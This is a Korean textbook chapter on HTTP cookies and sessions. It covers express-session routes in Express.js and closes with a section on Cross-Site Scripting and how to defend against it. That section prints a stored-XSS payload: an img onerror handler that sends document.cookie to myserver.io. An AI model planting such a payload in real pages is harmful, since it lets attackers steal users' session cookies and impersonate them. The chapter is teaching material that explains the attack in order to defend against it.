\section{HTTP Cookie and Session}\label{sect:http-cookie-and-session}

\sectref{sect:hash-functions-and-encryption}에서 비밀번호와 같은 민감한 정보를 적절히 암호화하여 저장하고, 검증하는 방법에 대해 알아보았으며, 이를 이용하여 사용자가 보낸 로그인 요청을 검증한 뒤 그 결과를 사용자에게 응답하는 로그인 기능을 구현할 수 있다. 서버는 특정 사용자에게만 제공되는 정보를 알맞게 제공하기 위해서는 사용자가 보내는 요청이 실제로 로그인에 성공한 사용자가 보낸 요청인지 구분할 수 있어야 한다. 이번 장에서는 서버에서 클라이언트를 어떻게 식별하는지, 클라이언트가 식별을 위한 정보를 어떻게 관리하는지 알아본다.

\subsection*{HTTP Cookie}

HTTP 프로토콜은 클라이언트가 서버에 요청을 보내면 서버가 그 요청에 대한 응답을 보내도록 설계된 프로토콜이다. 이때 하나의 클라이언트에서 두 개의 요청을 특정 서버에 보내면, 그 서버는 두 요청을 각각 독립적인 요청으로 인지한다. 즉, 서버는 요청을 보낸 클라이언트를 식별하지 못하며(\figref{fig:auth-without-cookie}), HTTP의 이러한 특징을 무상태(stateless)라고 한다.

HTTP에서는 클라이언트를 식별하기 위해 HTTP 쿠키(cookie)를 사용한다. 클라이언트는 서버에 보내는 HTTP 요청 헤더의 Cookie 속성의 값을 설정함으로써 쿠키를 보낼 수 있으며, 이러한 쿠키 값은 서버로부터 받는 HTTP 응답 헤더의 Set-Cookie 속성값을 이용하여 정한다.

\figref{fig:auth-with-cookie}\는 쿠키를 이용하여 서버가 클라이언트를 식별하는 예시이다. 클라이언트에서 아이디와 비밀번호 등 로그인에 필요한 정보와 함께 로그인 요청을 보내면 서버는 이를 검증한 뒤 응답 헤더의 Set-Cookie 속성의 값을 설정하여 검증 결과를 응답으로 보낸다. Chrome과 Firefox와 같은 웹 브라우저는 HTTP 응답을 분석하여 Set-Cookie 속성의 값을 저장해두었다가, 같은 서버에 보내는 요청 헤더의 Cookie 속성을 저장해둔 값으로 설정하여 요청을 보낸다. 서버에서는 이 요청을 받으면 헤더의 Cookie 값을 이용하여 클라이언트를 식별할 수 있다.

이렇게 쿠키를 이용하면 서버가 사용자를 쉽게 식별할 수 있다는 장점이 있으며, 그 외에도 팝업 보지 않기와 같은 임시적인 설정 등을 저장할 때 많이 사용된다. 그러나 쿠키를 이용한 사용자 식별은 몇 가지 단점을 갖는다. 먼저 쿠키에는 여러 데이터가 저장될 수 있고, 웹 사이트에서 제공하는 서비스가 많아질수록 쿠키가 저장하는 데이터가 커질 수 있는데, 매 HTTP 요청에 쿠키값을 명시하여 보내야하기 때문에 네트워크 부하를 초래한다.

두 번째, 쿠키는 보안에 매우 취약하다. 쿠키에는 민감한 개인정보 등이 포함되어있기 마련인데, 브라우저에서는 사용자의 쿠키를 HTTP 요청을 보낼 때 사용하기 위해 파일 형태로 저장해둔다. 이러한 파일이 탈취되거나 후술할 XSS 공격 등으로 인해 쿠키가 탈취된다면 쿠키의 내용이 유출될 수 있다. 또한 공격자는 쿠키를 조작하여 자신의 정보를 조작하거나 다른 사람인 것처럼 위장한 뒤 서버에 요청을 보내면 서버는 그 정보를 식별할 수 없으므로 공격자에게 잘못된 권한을 부여할 수도 있다.

\subsection*{Session}

세션(session)은 사용자에 대한 정보는 서버에 저장해두고, 해당 데이터에 부요한 고유 키를 쿠키로 주고받아 사용자를 식별하는 인증 방식으로, 쿠키가 갖는 단점을 일부분 보완할 수 있다.

세션을 통한 인증은 \figref{fig:auth-with-session}\과 같이 동작한다. 먼저 로그인 요청이 성공하면 서버는 사용자에 대한 모든 정보를 서버 내에 메모리나 파일, DB 등의 형태로 저장하고, 각 데이터에 대한 고유 키, 즉 세션 ID를 생성한다. 그리고 HTTP 응답 헤더의 Set-Cookie 값에 세션 ID를 명시하여 클라이언트에 전달한다. 이후 클라이언트가 HTTP 요청 헤더의 쿠키로 세션 ID를 명시하여 요청을 보내면 서버는 그 세션 ID에 해당하는 데이터를 찾아 사용자를 식별하게 된다.

이렇듯 세션은 쿠키가 갖는 단점인 네트워크 부하 문제와, 탈취되었을 때 민감한 정보가 바로 유출되는 문제를 해결지만, 단점 역시 존재한다. 먼저 세션은 서버 측의 부하를 초래한다. 로그인한 사용자 데이터를 서버 내의 메모리, 파일, DB 등에 저장하기 때문에 저장 용량 등의 자원이 충분히 확보되어 있어야 하며, 세션 ID를 이용하여 세션 데이터를 찾는 과정이 추가되어 이로 인한 속도 저하가 미세하게 마나 발생한다. 따라서 세션을 사용하기 위한 자원이 서버에 충분히 마련되어 있지 않은 경우 서버 프로그램이 kill 되어버리는, 흔히 말하는 ``서버 다운''이 발생할 수 있다. 또한, 세션 역시 보안 문제에서 완전히 자유롭지 못하다. 세션 ID는 어쨌든 HTTP 쿠키를 통해 전달되는 데이터이므로 세션 ID 자체가 탈취당할 수 있으며, 공격자가 탈취한 세션 ID를 이용하여 HTTP 요청을 보내면 서버는 이를 탈취당한 사용자로 인식하게 된다.

그러나 이러한 단점에도 불구하고 세션은 쿠키에 비해 더 많은 장점을 가지고 있고, 세션의 완벽한 대체재가 없기 때문에 세션을 통한 인증이 주로 사용되며, 웹 애플리케이션의 특징, 성격, 쿠키를 통해 공유하고자 하는 정보 등에 따라 적절히 사용하는 것이 좋다. 최근에는 세션이 갖는 부수적인 문제를 해결하기 위해 JWT(JSON Web Token)나 OAuth2 등의 토큰 기반 인증 시스템을 도입하기도 한다.

\figures{fig:http-auth-communication}{HTTP Authentication Communication}{
    \subfig{fig:auth-without-cookie}{Without Cookie}
        {images/authentication/auth-without-cookie.png}{.2968}
    \subfig{fig:auth-with-cookie}{With Cookie}
        {images/authentication/auth-with-cookie.png}{.3148}
    \subfig{fig:auth-with-session}{With Session}
        {images/authentication/auth-with-session.png}{.3184}
}

\subsection*{Session Management in Express.js}

Express.js에서 제공하는 세션 관리 모듈 express-session을 이용하여 세션을 이용한 서버 기반 인증 시스템을 구현한다. express와 express-session 모듈을 설치한 뒤 \coderef{code:express-session-config}\와 같이 코드를 작성한다.

\begin{codeenv}{code:express-session-config}{Session Configuration in Express.js}\begin{verbatim}
const express = require('express');
const session = require('express-session');

const app = express();
const port = 3000;

app.use(session({
    secret: '!@#$%^&*()',
    resave: false,
    saveUninitialized: true,
}));

app.listen(port, () => console.log(`Server listening on port ${port}!`));
\end{verbatim}
\end{codeenv}

\coderef{code:express-session-config}에서는 express-session 모듈을 이용하여 세션 관리 미들웨어를 생성하고, 이를 \cd{app} 객체에 bind하였다. 이때 \cd{secret} 값은 세션 ID를 암호화하기 위한 key로, 실제 서비스에서는 길고 랜덤하게 생성되어야 하며, 별도로 보관되어야 한다.

\begin{codeenv}{code:create-session}{Create Session (Derived from \coderef{code:express-session-config})}\begin{verbatim}
app.get('/set/:id', (req, res) => {
    const { id } = req.params;
    if (!id) return res.sendStatus(400);
    req.session.requester = {
        id: parseInt(id, 10),
        name: `user#${id}`,
        level: Math.floor(Math.random() * 10) + 1,
    };
    return res.send(`Completed /set/${id}`);
});
\end{verbatim}
\end{codeenv}

\coderef{code:create-session}\은 \coderef{code:express-session-config}에 \cd{params.id} 값에 따라 세션을 생성하고, 클라이언트에 응답을 보내는 GET /set/:id 라우트를 구현한 코드이다. 세션은 요청 객체의 \cd{session} 객체에 값을 할당함으로써 생성할 수 있으며, 이때 세션 ID가 같이 생성되면서 세션 데이터와 함께 메모리에 저장된다. 이후 세션 미들웨어는 HTTP 응답 헤더의 Set-Cookie 값이 생성된 세션 ID으로 설정하여 클라이언트에 보낸다.

\begin{codeenv}{code:access-session}{Access Session (Derived from \coderef{code:express-session-config})}\begin{verbatim}
app.get('/get', (req, res) => {
    const { requester } = req.session;
    if (!requester) return res.sendStatus(401);
    const { id, name, level } = requester;
    return res.send(`id: ${id} / name: ${name} / level: ${level}`);
});
\end{verbatim}
\end{codeenv}

\coderef{code:access-session}\은 \coderef{code:express-session-config}에 세션 ID에 따른 세션 데이터를 텍스트 형태로 응답하는 GET /get 라우트를 구현한 코드이다. 세션 미들웨어는 HTTP 요청의 쿠키에서 세션 ID를 찾고, 이를 이용하여 세션 데이터를 요청 객체의 \cd{session} 객체에 할당한다. 세션 데이터는 \coderef{code:create-session}에서 세션을 생성할 때 사용한 속성명과 같은 이름의 객체, 즉 \cd{requester} 객체를 통해 접근할 수 있다.

\begin{codeenv}{code:destroy-session}{Destroy Session (Derived from \coderef{code:express-session-config})}\begin{verbatim}
app.get('/destroy', (req, res) => {
    req.session.destroy(err => {
        if (err) return res.sendStatus(500);
        else return res.send('Destroy Completed');
    });
});
\end{verbatim}
\end{codeenv}

\coderef{code:destroy-session}\은 \coderef{code:express-session-config}에 요청한 클라이언트에 해당하는 세션을 삭제하는 GET /destroy 라우트를 구현한 코드이다. 로그아웃 기능은 세션을 삭제하여 수행된다.

\figures{fig:insomnia-cookie}{Cookie Management on Insomnia}{
    \subfig{fig:insomnia-cookie-set}{Set-Cookie on Response Header}
        {images/authentication/insomnia-cookie-set.png}{.475}
    \subfig{fig:insomnia-cookie-send}{Cookie on Request Header}
        {images/authentication/insomnia-cookie-send.png}{.475}
}

서버를 실행하고 Insomnia를 이용하여 쿠키를 받고 보내본다. GET /set/:id 라우트로 요청을 보내면 서버는 응답 헤더의 Set-Cookie 속성에 쿠키값을 설정하여 응답하며, GET /get 요청을 보낼 때 Header 탭에서 Cookie의 값을 응답을 통해 받은 쿠키값으로 설정하여 보내면 세션에 저장된 데이터를 응답받을 수 있다.

\figures{fig:view-cookie}{View Cookie on Browsers}{
    \subfig{fig:view-cookie-chrome}{Chrome}
        {images/authentication/view-cookie-chrome.png}{.475}
    \subfig{fig:view-cookie-firefox}{Firefox}
        {images/authentication/view-cookie-firefox.png}{.475}
}

Chrome이나 Firefox 등의 브라우저에서도 웹 서버의 동작을 확인해본다. 또한, 각 브라우저의 개발자 도구에서는 쿠키값을 확인할 수 있는데, \figref{fig:view-cookie}\와 같이 개발자 도구의 Application 탭이나 Storage 탭을 이용하여 브라우저(클라이언트)가 저장하는 쿠키의 값을 확인해본다.

\subsection*{Cross-Site Scripting (XSS)}

앞에서 언급한 바와 같이 쿠키를 이용한 인증 방식은 구조적으로 보안 문제를 가지고 있으며, 세션 방식 역시 이 문제에서 완전히 자유롭지 못하다. 예를 들어 공격자가 A라는 사용자가 서버와의 통신을 위해 저장한 쿠키에 포함된 세션 ID를 탈취하고 이를 이용하여 HTTP 요청을 보내면 서버는 공격자를 사용자 A로 인식한다.

쿠키를 탈취하는 여러 방법 중 가장 기초적인 방법은 Cross-Site Scripting(XSS)이다. 공격자는 다른 사용자의 쿠키값을 공격자의 서버로 전송하는 악성 스크립트를 HTML 문서에 삽입하여 해당 문서를 열람한 사용자의 쿠키를 탈취한다. 이러한 공격은 대체로 게시글 등록 기능, 특히 HTML 작성 기능을 통해 주로 발생하며 악성 스크립트를 포함한 게시글을 열람한 사용자는 공격자에게 쿠키를 탈취당하게 된다.

\begin{codeenv}{code:xss-example}{Simple Example of XSS}\begin{verbatim}
<p>Welcome!</p>
<img src="#"
     onerror="location.href=$`http://myserver.io/get_cookie?cookie=${document.cookie}`">
\end{verbatim}
\end{codeenv}

\coderef{code:xss-example}\은 XSS 공격의 간단한 예시로, 공격자가 이러한 내용의 글을 등록하면 서버의 DB에 저장한다. 이후 다른 사용자가 이 게시물을 열람하기 위해 요청을 보내면 이 코드가 포함된 HTML 문서를 응답으로 받게되며, \cd{img} 태그의 \cd{src}에 해당하는 링크가 존재하지 않으므로 \cd{onerror} 속성의 JS 코드가 실행된다. \cd{document.cookie} 객체에는 그 HTML 문서를 요청하는데 사용된 쿠키가 저장되어 있으므로 myserver.io라는 서버에 쿠키값을 그대로 전송하게 된다.

이렇게 XSS는 공격자 입장에서는 공격하기 쉽고, 개발자 입장에서는 방어하기 힘들며, 일반 사용자 입장에서는 당하기 쉽고 당했는지도 알기 힘든 공격 방식이다. 이로 인해 사용자가 다른 웹 사이트에 접속하려고 할 때 신뢰할 수 있는 사이트에만 접속하라는 메시지를 띄우는 웹 사이트도 있다.

웹 서버 개발자는 XSS 공격을 반드시 방어하여야 한다. 사용자로부터 들어오는 입력값 중 게시글과 같이 DB에 저장된 후 다른 사용자에게 보여지는 입력값을 검증하여, XSS가 발생할 수 있는 부분을 제거해야 하며, 이러한 작업을 sanitize(소독)라고 한다. 다행히도 이러한 sanitize 작업을 수행해주는 모듈이 많이 개발되어 있어 개발자는 이러한 모듈을 적극 활용하여 XSS 공격을 예방할 수 있다. 또한, 궁극적인 방어 방법은 아니지만 쿠키를 \cd{HttpOnly}로 설정하여 \cd{document.cookie}를 통해 쿠키값에 접근할 수 없게 할 수도 있다. 앞의 \coderef{code:express-session-config}\는 \cd{HttpOnly} 쿠키를 추가하였으며, \figref{fig:insomnia-cookie-set}\과 \figref{fig:view-cookie}\를 통해 확인할 수 있다.
